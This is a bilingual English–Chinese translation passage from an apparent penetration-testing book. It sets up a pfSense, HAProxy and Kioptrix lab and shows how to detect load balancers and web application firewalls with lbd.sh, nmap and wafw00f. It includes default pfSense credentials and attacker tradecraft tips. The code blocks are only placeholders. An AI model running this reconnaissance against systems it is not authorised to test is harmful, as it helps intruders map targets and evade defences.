- en: 'If we do not want to manually reconfigure the pfSense virtual machine every
    time that it is loaded up, we need to perform a full installation onto our dedicated
    virtual hard drive. The following steps will walk you through the necessary process:'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们不想每次加载pfSense虚拟机时都手动重新配置它，我们需要在专用虚拟硬盘上执行完整安装。以下步骤将引导您完成必要的过程：
- en: Click on **Start** which will begin the boot up sequence of the pfSense virtual
    machine.
  id: totrans-98
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 单击“启动”，这将开始pfSense虚拟机的引导序列。
- en: Press *1* to continue with the boot up.
  id: totrans-99
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 按*1*继续引导。
- en: 'Press *I* to proceed with installation. Use the following settings in sequence
    where appropriate when prompted:'
  id: totrans-100
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 按*I*继续安装。在适当的时候按顺序使用以下设置：
- en: Accept these Settings
  id: totrans-101
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 接受这些设置
- en: Quick/Easy Install
  id: totrans-102
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 快速/简易安装
- en: OK
  id: totrans-103
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 好的
- en: Symmetric multiprocessing kernel (more than one processor)
  id: totrans-104
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 对称多处理内核（多个处理器）
- en: Reboot
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 重新启动
- en: Note
  id: totrans-106
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: To avoid the installation media from booting up at the next reboot the installation
    media may need to be 'ejected' by selecting the **Devices | CD/DVD Devices** and
    un-checking `pfsense.iso` in the menu.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 为了避免安装介质在下次重启时启动，可能需要通过选择**设备 | CD/DVD设备**并在菜单中取消选中`pfsense.iso`来“弹出”安装介质。
- en: Once the system reboots the system will query if you would like to set up the
    VLANs now. Type *y* and press *Enter* to continue.
  id: totrans-108
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 系统重新启动后，系统将询问您是否要立即设置VLAN。输入*y*并按*Enter*继续。
- en: At the **Enter the parent interface name for the new VLAN** prompt type `le0`
    and press *Enter*.
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**输入新VLAN的父接口名称**提示处输入`le0`并按*Enter*。
- en: Type *1* at the **Enter the VLAN tag**.
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**输入VLAN标记**处输入*1*。
- en: At the **Enter the parent interface name for the new VLAN** prompt type `le1`
    and press *Enter*.
  id: totrans-111
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**输入新VLAN的父接口名称**提示处，输入`le1`并按*Enter*。
- en: Type *2* at the **Enter the VLAN tag**.
  id: totrans-112
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**输入VLAN标记**处输入*2*。
- en: Press *Enter*.
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 按*Enter*。
- en: 'At the **Enter the WAN interface** prompt type the **WLAN1** interface. You
    can look at the settings in the VirtualBox to find out which network adapter MAC
    address is the WLAN adapter. As an example, we will use: `le0` and press *Enter*.'
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**输入WAN接口**提示处，输入**WLAN1**接口。您可以查看VirtualBox中的设置，找出哪个网络适配器MAC地址是WLAN适配器。作为示例，我们将使用：`le0`并按*Enter*。
- en: Press *Enter* and select the appropriate adapter for LAN as well (choose the
    VLAN1 adapter, `le1` in my case).
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 按*Enter*，并选择适当的适配器用于LAN（在我的情况下选择VLAN1适配器，`le1`）。
- en: To continue press *Enter* and then *y*, when prompted to continue.![pfSense
    virtual machine persistence](img/7744_05_09.jpg)
  id: totrans-116
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 继续按*Enter*，然后在提示时按*y*继续。![pfSense虚拟机持久性](img/7744_05_09.jpg)
- en: 'Congratulations, your lab setup is almost complete! There are a few additional
    settings that will need to be configured before we can get started on the more
    interesting portions of this chapter. At this point you should be looking at a
    screen similar to the following:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 恭喜，您的实验室设置几乎完成了！在我们开始本章更有趣的部分之前，还有一些额外的设置需要配置。此时，您应该看到类似以下的屏幕：
- en: '![pfSense virtual machine persistence](img/7744_05_10.jpg)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![pfSense虚拟机持久性](img/7744_05_10.jpg)'
- en: Configuring the pfSense DHCP server
  id: totrans-119
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 配置pfSense DHCP服务器
- en: Before we can begin we need to set up the built-in DHCP server so that our other
    machines can pick up addresses on the VLAN1 interface without having to be manually
    configured. Using the pfSense to manage the DHCP connections provides us with
    more control than if we simply use the built-in functionality that VirtualBox
    provides.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始之前，我们需要设置内置的DHCP服务器，以便我们的其他机器可以在VLAN1接口上获取地址，而无需手动配置。使用pfSense来管理DHCP连接比起简单使用VirtualBox提供的内置功能，能够提供更多的控制。
- en: From the pfSense console select **2) Set interface(s) IP address**.
  id: totrans-121
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从pfSense控制台中选择**2)设置接口IP地址**。
- en: At the **Enter the number of the interface you wish to configure:** prompt we
    need to type *2* to choose the LAN interface and press *Enter*.
  id: totrans-122
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**输入您要配置的接口的编号：**提示处，我们需要输入*2*选择LAN接口，并按*Enter*。
- en: 'Type the following IP address when prompted: `192.168.75.1` and press *Enter*.'
  id: totrans-123
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在提示时输入以下IP地址：`192.168.75.1`并按*Enter*。
- en: At the **Enter the new LAN IPv4 subnet bit count** prompt type `24` and press
    *Enter*.
  id: totrans-124
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**输入新LAN IPv4子网位数**提示处输入`24`并按*Enter*。
- en: Type *y* at the prompt when asked if you would like to enable the DHCP server
    on LAN. Press *Enter* to continue.![Configuring the pfSense DHCP server](img/7744_05_11.jpg)
  id: totrans-125
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当询问是否要在LAN上启用DHCP服务器时，输入*y*。按*Enter*继续。![配置pfSense DHCP服务器](img/7744_05_11.jpg)
- en: 'When asked to provide the starting address range type: `192.168.75.10` and
    press *Enter*.'
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当要求提供起始地址范围时，输入`192.168.75.10`并按*Enter*。
- en: You will be asked to select the ending DHCP range. Type `192.168.75.50` and
    press *Enter*.![Configuring the pfSense DHCP server](img/7744_05_12.jpg)
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 您将被要求选择结束的DHCP范围。输入`192.168.75.50`并按*Enter*。![配置pfSense DHCP服务器](img/7744_05_12.jpg)
- en: Starting the virtual lab
  id: totrans-128
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 启动虚拟实验室
- en: 'The systems should be booted in the following order every time that you load
    up your testing network:'
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 每次加载测试网络时，系统应按以下顺序启动：
- en: pfSense VLAN1
  id: totrans-130
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: pfSense VLAN1
- en: BackTrack
  id: totrans-131
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: BackTrack
- en: Kioptrix VM Level 3
  id: totrans-132
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Kioptrix VM Level 3
- en: Kioptrix VM Level 3 Clone
  id: totrans-133
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Kioptrix VM Level 3 Clone
- en: Ubuntu_TestMachine_1
  id: totrans-134
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Ubuntu_TestMachine_1
- en: Tip
  id: totrans-135
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: Remember that in BackTrack or Ubuntu you can use the `dhclient` command-line
    command at any time to release and renew the IP addresses. Check the addresses
    using `ifconfig` afterwards to ensure that the DHCP server is working properly.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，在BackTrack或Ubuntu中，您可以随时使用`dhclient`命令行命令释放和更新IP地址。之后使用`ifconfig`检查地址，以确保DHCP服务器正常工作。
- en: 'If you are experiencing issues with the machine picking up IPs from the wrong
    DHCP server you will also need to turn off the VirtualBox DHCP server we enabled
    in previous chapters. Detailed instructions of the more advanced features of VirtualBox
    can be found on the Internet at: [http://www.virtualbox.org/manual/ch08.html](http://www.virtualbox.org/manual/ch08.html).'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您遇到机器从错误的DHCP服务器获取IP的问题，您还需要关闭我们在前几章中启用的VirtualBox DHCP服务器。有关VirtualBox更高级功能的详细说明可以在互联网上找到：[http://www.virtualbox.org/manual/ch08.html](http://www.virtualbox.org/manual/ch08.html)。
- en: pfSense DHCP — Permanent reservations
  id: totrans-138
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: pfSense DHCP — 永久预留
- en: We can now log in to the web console of our virtual pfSense firewall to set
    up static IPs for the two Kioptrix machines.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以登录到虚拟pfSense防火墙的Web控制台，为两台Kioptrix机器设置静态IP。
- en: Open up the Firefox web browser that comes preinstalled in BackTrack and head
    over to `http://192.168.75.1` which is the web console interface for the pfSense
    virtual machine. If everything is configured properly you will be asked for your
    username and password.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 打开预装在BackTrack中的Firefox Web浏览器，转到`http://192.168.75.1`，这是pfSense虚拟机的Web控制台界面。如果一切配置正确，系统将要求您输入用户名和密码。
- en: '**Username:**`admin`'
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**用户名：**`admin`'
- en: '**Password:**`pfsense`'
  id: totrans-142
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**密码：**`pfsense`'
- en: Note
  id: totrans-143
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: If you followed standard best practice when setting up your machine you have
    probably already changed the default password for the pfSense instance. If this
    is the case, use that instead of the default and kudos for being proactive!
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您在设置机器时遵循了标准最佳实践，您可能已经更改了pfSense实例的默认密码。如果是这种情况，请使用该密码而不是默认密码，并为积极主动表示赞赏！
- en: The pfSense dashboard provides a significant amount of data. For now we are
    focused only on setting up the load balancing. Follow these steps to allow pfSense
    to load balance the web application for the two Kioptrix guest machines.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: pfSense仪表板提供了大量的数据。现在我们只关注设置负载平衡。按照以下步骤允许pfSense为两台Kioptrix客户机负载平衡Web应用程序。
- en: First we need to know which MAC addresses belong to each Kioptrix machine so
    that we can set up static leases. This can be accomplished by checking the VirtualBox
    Manager settings for each box and looking at the **Network Settings**.
  id: totrans-146
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，我们需要知道哪些MAC地址属于每台Kioptrix机器，以便我们可以设置静态租约。这可以通过检查每个框的VirtualBox Manager设置并查看**网络设置**来完成。
- en: In the pfSense web console click on **Status | DHCP Leases** for a listing of
    current leases. Match the IP up to the MAC address for each Kioptrix machine.
  id: totrans-147
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在pfSense Web控制台中，单击**状态|DHCP租约**以获取当前租约列表。将IP地址与每台Kioptrix机器的MAC地址进行匹配。
- en: Set up static IP address assignments for both machines by using the button to
    the right of the entry to open the static assignment window.![pfSense DHCP — Permanent
    reservations](img/7744_05_13.jpg)
  id: totrans-148
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过使用右侧的按钮打开静态分配窗口，为两台机器设置静态IP地址分配。![pfSense DHCP — Permanent reservations](img/7744_05_13.jpg)
- en: 'In the **Services: DHCP: Edit static mapping** window you will need to type
    in an IP address that is outside of the DHCP range. This will ensure that each
    time the machine connects it receives the same IP address. Type `192.168.75.102`
    in the IP address field.![pfSense DHCP — Permanent reservations](img/7744_05_14.jpg)'
  id: totrans-149
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**服务：DHCP：编辑静态映射**窗口中，您需要输入一个在DHCP范围之外的IP地址。这将确保每次机器连接时都会收到相同的IP地址。在IP地址字段中输入`192.168.75.102`。![pfSense
    DHCP — Permanent reservations](img/7744_05_14.jpg)
- en: Enter **Kioptrix2** in the **Hostname**.
  id: totrans-150
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**主机名**中输入**Kioptrix2**。
- en: Type a description of your choice. This will be stored in the DHCP settings
    so that they can be reviewed in the future.
  id: totrans-151
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入您选择的描述。这将存储在DHCP设置中，以便将来进行审查。
- en: Note
  id: totrans-152
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: As a penetration tester it is of note that sometimes administrators will enter
    very good notes into their DHCP listings. This makes it easy to find valuable
    machines on the network if you happen to take over a system that acts as a DHCP
    server.
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 作为渗透测试人员，值得注意的是，有时管理员会在其DHCP列表中输入非常好的注释。如果您碰巧接管了充当DHCP服务器的系统，这将使您更容易找到网络上有价值的机器。
- en: Click on **Save** to complete the task.
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 单击**保存**以完成任务。
- en: Apply the settings. Scroll down to view the static DHCP addresses. This list
    includes information about all of your assigned IP addresses.![pfSense DHCP —
    Permanent reservations](img/7744_05_15.jpg)
  id: totrans-155
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 应用设置。向下滚动以查看静态DHCP地址。此列表包括有关所有分配的IP地址的信息。![pfSense DHCP — Permanent reservations](img/7744_05_15.jpg)
- en: Installing HAProxy for load balancing
  id: totrans-156
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装HAProxy进行负载平衡
- en: To practice detecting load balancers we will need to set one up in our virtual
    lab. We can use our existing Ubuntu machine for this task.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 为了练习检测负载均衡器，我们需要在我们的虚拟实验室中设置一个。我们可以使用我们现有的Ubuntu机器来完成这项任务。
- en: Note
  id: totrans-158
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: If experiencing difficulties when running HAProxy be sure to verify that you
    have turned off your Apache install from previous chapters. If the port is already
    bound by Apache or anything else, you will be unable to set up load balancing
    on the same port.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在运行HAProxy时遇到困难，请确保验证您已关闭之前章节中的Apache安装。如果端口已被Apache或其他任何东西绑定，您将无法在同一端口上设置负载平衡。
- en: Enable the NAT setting on your Ubuntu virtual machine and boot it up.
  id: totrans-160
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在您的Ubuntu虚拟机上启用NAT设置并启动它。
- en: Enable **Network Adapter 2** on your virtual machine. Ensure that it is using
    VLAN1\. Set up a static DHCP lease for your Ubuntu machine. Use `192.168.75.200`
    as the IP address. Refresh your IP address information using `dhclient` in the
    console. Verify that you are now using `192.168.75.200` on one of your adapters.
  id: totrans-161
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在虚拟机上启用**网络适配器2**。确保它使用VLAN1。为您的Ubuntu机器设置一个静态DHCP租约。使用`192.168.75.200`作为IP地址。在控制台中使用`dhclient`刷新您的IP地址信息。验证您现在的一个适配器正在使用`192.168.75.200`。
- en: Click on the **Applications | Ubuntu Software Center** in the top-left navigation
    bar.
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 单击左上导航栏中的**应用程序|Ubuntu软件中心**。
- en: Type `HAProxy` in the search field in the top-left of the **Ubuntu Software
    Center** screen.
  id: totrans-163
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**Ubuntu软件中心**屏幕的左上角的搜索字段中键入`HAProxy`。
- en: Choose the **Install** button and enter your password at the prompt.
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**安装**按钮，并在提示时输入密码。
- en: Note
  id: totrans-165
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: If you experience errors in regards to untrusted packages you can run `apt-get
    update` and `apt-get upgrade` to continue with the installation.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您在安装过程中遇到与不受信任的软件包相关的错误，可以运行`apt-get update`和`apt-get upgrade`来继续安装。
- en: We need to edit the configuration file to set up a load balancer for our two
    Kioptrix machines. Open up a terminal session and edit the `/etc/haproxy/haproxy.cfg`
    file. Remember to escalate privilege with `sudo` for write access. Remove all
    other `.cfg` files from this directory afterwards.
  id: totrans-167
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们需要编辑配置文件以为我们的两台Kioptrix机器设置负载均衡器。打开终端会话并编辑`/etc/haproxy/haproxy.cfg`文件。记得使用`sudo`提升权限以进行写访问。然后从该目录中删除所有其他`.cfg`文件。
- en: '[PRE4]'
  id: totrans-168
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: Your file should match the following before saving and exiting:![Installing
    HAProxy for load balancing](img/7744_05_16.jpg)
  id: totrans-169
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在保存并退出之前，您的文件应该与以下内容匹配：![Installing HAProxy for load balancing](img/7744_05_16.jpg)
- en: 'Our Ubuntu machine already has a web server running so we must disable it for
    this exercise to work properly:'
  id: totrans-170
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们的Ubuntu机器已经运行了一个Web服务器，所以我们必须禁用它才能使这个练习正常工作：
- en: '[PRE5]'
  id: totrans-171
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'It is time to start up the load balancer:'
  id: totrans-172
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 是时候启动负载均衡器了：
- en: '[PRE6]'
  id: totrans-173
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: If everything is configured properly you will find that you can now browse to
    your Kioptrix machines using the IP address `192.168.75.200`.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 如果一切配置正确，您将发现现在可以使用IP地址`192.168.75.200`浏览到您的Kioptrix机器。
- en: Adding Kioptrix3.com to the host file
  id: totrans-175
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 将Kioptrix3.com添加到主机文件
- en: 'Let''s add `Kioptrix3.com` to our hosts file on BackTrack and try our luck
    at detecting which machine is being accessed. In your BackTrack terminal, change
    directory to `/etc`, open up the `hosts` file in an editor of your choice and
    add the following to the file:'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们在BackTrack上的hosts文件中添加`Kioptrix3.com`，并尝试侦测正在访问哪台机器。在BackTrack终端中，切换到`/etc`目录，用你选择的编辑器打开`hosts`文件，并添加以下内容到文件中：
- en: '[PRE7]'
  id: totrans-177
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: Verify connectivity by pinging `kioptrix3.com:`
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 通过ping `kioptrix3.com`来验证连接：
- en: '[PRE8]'
  id: totrans-179
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '[PRE9]'
  id: totrans-180
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: Detecting load balancers
  id: totrans-181
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 检测负载均衡器
- en: When performing a penetration test there is the possibility that vulnerabilities
    left open on one server are not available on another. Proper load balancing will
    be almost completely transparent which could easily lead to miscommunication of
    the testing results if you find any server issues on a server that is part of
    a pool.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 在进行渗透测试时，有可能一个服务器上留下的漏洞在另一个服务器上是不可用的。适当的负载均衡几乎是完全透明的，这可能很容易导致测试结果的误传，如果您在负载均衡池中的任何服务器上发现了任何服务器问题。
- en: Tip
  id: totrans-183
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: We are focusing on HTTP load balancing for these exercises. Detecting DNS load
    balancing can be done by using your enumeration tools described in a previous
    chapter. For instance, you could use dig to see if multiple servers are returned
    for the same domain name.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 我们专注于HTTP负载均衡的练习。检测DNS负载均衡可以通过使用前一章描述的枚举工具来完成。例如，您可以使用dig来查看是否为同一域名返回了多个服务器。
- en: Quick reality check — Load Balance Detector
  id: totrans-185
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 快速现实检查 —— 负载均衡检测器
- en: BackTrack 5 includes a script named Load Balance Detector (lbd.sh) that will
    quickly test for load balancing. Running this tool against our current balanced
    `Kioptrix3.com` server will provide you with input that the server is not load
    balanced because the tool never gets a chance to see the other server.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: BackTrack 5包括一个名为负载均衡检测器（lbd.sh）的脚本，它将快速测试负载均衡。运行这个工具对我们当前的负载均衡`Kioptrix3.com`服务器将为您提供输入，表明服务器没有负载均衡，因为该工具从未有机会看到其他服务器。
- en: 'However, if you edit your HAProxy configuration on the Ubuntu machine to use
    a round robin balance type (balance `roundrobin)` and reboot, the following command
    will find your balancer:'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，如果您在Ubuntu机器上编辑HAProxy配置以使用轮询平衡类型（平衡`roundrobin`）并重新启动，以下命令将找到您的负载均衡器：
- en: '[PRE10]'
  id: totrans-188
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '[PRE11]'
  id: totrans-189
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: Note
  id: totrans-190
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Become familiar with the various types of load balancing that can be implemented
    so that it becomes easier to detect exactly what the network really looks like.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 熟悉可以实现的各种负载均衡类型，这样就更容易准确地检测网络的真实情况。
- en: So, what are we looking for anyhow?
  id: totrans-192
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 那么，我们到底在寻找什么呢？
- en: A site can be hosted by many different servers with varying degrees of security.
    Sometimes it only takes one of these servers to finish the job and penetration
    testers need to ensure that nothing is overlooked.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 一个站点可以由许多不同的服务器托管，安全程度也不同。有时只需要其中一个服务器就能完成工作，渗透测试人员需要确保没有遗漏。
- en: 'As highlighted in the preceding example, it is not always possible to determine
    if a site is balanced or not. `lbd.sh` has provided us with an interesting fact:
    it was able to determine the site was being balanced by reviewing the `HTTP[Date]`
    method. Small changes between the servers being accessed are the key to making
    an accurate determination.'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的例子所强调的，有时候不可能确定一个站点是否是负载均衡的。`lbd.sh`给我们提供了一个有趣的事实：它能够通过查看`HTTP[Date]`方法来确定站点是否正在负载均衡。访问的服务器之间的小变化是准确确定的关键。
- en: Note
  id: totrans-195
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Just a simple scan between two systems that are being load balanced will reinforce
    that ALL systems need to be enumerated and tested, not just a few.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 只是在两个正在负载均衡的系统之间进行简单的扫描将强调需要对所有系统进行枚举和测试，而不仅仅是一部分。
- en: 'When running an nmap scan against the servers in our balanced pool we see the
    following results:'
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 当对我们负载均衡池中的服务器运行nmap扫描时，我们看到以下结果：
- en: '[PRE12]'
  id: totrans-198
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: '[PRE13]'
  id: totrans-199
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: This information is expected. But how does it compare against the other Kioptrix
    machine?
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 这些信息是预期的。但它与其他Kioptrix机器相比如何？
- en: '[PRE14]'
  id: totrans-201
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: '[PRE15]'
  id: totrans-202
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'We see that many of the findings are identical as expected, but here there
    is one minor difference to look for: the MAC address of `192.168.75.102` is different
    than that of `192.168.75.101`. If these systems were not identical clones of one
    another then there is a possibility that other differences would be visible as
    well. These are the little differences we will need to seek out.'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到许多发现与预期相同，但这里有一个小的差异需要查找：`192.168.75.102`的MAC地址与`192.168.75.101`的不同。如果这些系统不是彼此的完全克隆，那么其他差异也可能是可见的。这些是我们需要寻找的小差异。
- en: Our web application is hosted by the Kioptrix machines, but is being balanced
    by our Ubuntu machine. This would typically be a virtual IP address used strictly
    to provide access to the two production machines that host our application, possibly
    in a tiered DMZ. Of course, if the app developers or administrators left holes
    in one of the servers or the application, we will quickly be able to bypass any
    such security measures and go directly to where the critical infrastructure and
    data lies.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的Web应用程序由Kioptrix机器托管，但由我们的Ubuntu机器进行负载均衡。这通常是一个虚拟IP地址，严格用于提供对托管我们应用程序的两台生产机器的访问，可能是在分层DMZ中。当然，如果应用程序开发人员或管理员在其中一台服务器或应用程序中留下了漏洞，我们将很快能够绕过任何这样的安全措施，直接进入关键的基础设施和数据所在的地方。
- en: Tip
  id: totrans-205
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: HTTP response headers can provide information that highlights load balancers
    as well. Using tools that allow you to look at these headers you can determine
    if there are these types of differences that indicate more than one machine serving
    the same web pages.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP响应标头还可以提供突出显示负载均衡器的信息。使用允许您查看这些标头的工具，您可以确定是否存在这些类型的差异，表明有多台机器提供相同的网页。
- en: Detecting Web Application Firewalls (WAF)
  id: totrans-207
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 检测Web应用程序防火墙（WAF）
- en: We need to understand if there is also an inline web application firewall that
    we should be aware of. BackTrack addresses this need by providing WAFW00F, a tool
    that will attempt to detect most commonly used web application firewalls. This
    script was created by Sandro Gauci and Wendel G. Henrique and it can be downloaded
    from the project site download section at [http://code.google.com/p/waffit/](http://code.google.com/p/waffit/).
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要了解是否还有内联Web应用程序防火墙需要我们注意。BackTrack通过提供WAFW00F来满足这一需求，这是一个尝试检测最常用的Web应用程序防火墙的工具。这个脚本是由Sandro
    Gauci和Wendel G. Henrique创建的，可以从项目网站的下载部分下载[http://code.google.com/p/waffit/](http://code.google.com/p/waffit/)。
- en: 'Invoke the command from your BackTrack terminal using the following commands:'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 使用以下命令从BackTrack终端调用命令：
- en: '[PRE16]'
  id: totrans-210
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: '[PRE17]'
  id: totrans-211
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'As with most tools provided by hard working developers there is an example
    of the syntax when running `wafw00f.py` without any input variables. We will follow
    the usage example syntax provided:'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 与大多数由辛勤工作的开发人员提供的工具一样，当运行`wafw00f.py`时，没有任何输入变量的语法示例。我们将遵循提供的用法示例语法：
- en: '[PRE18]'
  id: totrans-213
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: '[PRE19]'
  id: totrans-214
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: 'The highlighted response indicates that no WAF was located. This should make
    our job of penetrating the Kioptrix machine easier. Now what should we expect
    to see if there is actually a web application firewall in place? Here are the
    results against such a configuration:'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 突出显示的响应表明没有找到WAF。这应该会让我们渗透Kioptrix机器的工作变得更容易。那么，如果实际上有Web应用程序防火墙，我们应该期望看到什么呢？以下是针对这种配置的结果：
- en: '[PRE20]'
  id: totrans-216
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: As you can see this information clearly defines both the fact that the site
    is being protected, and in this case that it is using ModSecurity (which it really
    is). We would keep this fact in mind when performing our tests and try to use
    techniques that are known to work when testing against sites using this particular
    software. These tactics change over time and thus, you should try to emulate the
    environment you are testing before trying out the exploits on the production network.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您所看到的，这些信息清楚地定义了网站正在受到保护的事实，以及在这种情况下它正在使用ModSecurity（实际上确实是）。在进行测试时，我们应该牢记这一事实，并尝试使用已知可用于测试使用此特定软件的站点的技术。这些策略会随时间而变化，因此在尝试在生产网络上使用漏洞之前，您应该尝试模拟您正在测试的环境。
- en: Taking on Level 3 — Kioptrix
